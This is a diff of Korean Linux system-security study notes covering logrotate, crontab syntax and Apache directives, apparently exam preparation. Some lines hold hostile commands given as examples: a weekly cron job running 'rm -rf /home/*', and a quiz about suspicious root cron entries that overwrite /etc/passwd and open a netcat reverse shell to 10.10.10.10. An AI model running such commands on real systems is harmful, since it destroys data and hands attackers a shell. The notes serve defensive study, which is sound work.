@@ -23,7 +23,6 @@ defaults
 
 ●logrotate.conf(/etc/logrotate.conf)
 시스템에서 사용하는 로그들이 무한정 쌓이지 않도록 순환 시키는 기능을 하는 설정 파일
-
 wtmp로그에 대해 로그파일을 압축하고 주 단위로 새로 생성하고자 할 때>
 compress
 /var/log/wtmp {
@@ -60,8 +59,7 @@ crontab -l --현재 스케줄링 되어 있는 작업 내용 보기
 crontab -u sis -e --sis계정의 crontab 편집
 0 2 * * 0 rm -rf /home/* --매주 일요일 새벽2시에 rm -rf명령을 이용하여 /home디렉터리 하위 모든 파일과 디렉터리를 삭제하는 crontab스케줄
 //분(0-59) 시(0-23) 일(1-31) 월(1-12) 요일(0-6) 작업내용
-
-웹서버 점검 중 cron에 새로운 작업이 등록된 것을 확인. root권한으로 실행될 경우 발생할 수 있는 위험?
+<웹서버 점검 중 cron에 새로운 작업이 등록된 것을 확인. root권한으로 실행될 경우 발생할 수 있는 위험??>
 0 0 6 * * root /bin/cp /tmp/passwd1 /etc/passwd
 0 0 12 * * root /usr/bin/nc 10.10.10.10 80 -e /bin/bash
 -임의로 조작된 passwd파일이 원래 passwd파일을 덮어씀
@@ -99,7 +97,7 @@ KeepAliveTimeout 100       : 언제까지 접속을 유지할지(초단위)
 LimitRequestBody : 전송가능한 최대사이즈를 제한
 indexes : 디렉터리 검색 기능 제거(Otions지시자 - indexes 옵션 제거 후 저장)
 <Directory />
-Options indexes followsymlinks )
+Options indexes followsymlinks
 AllowOverride None
 Order allow, deny
 Allow from all
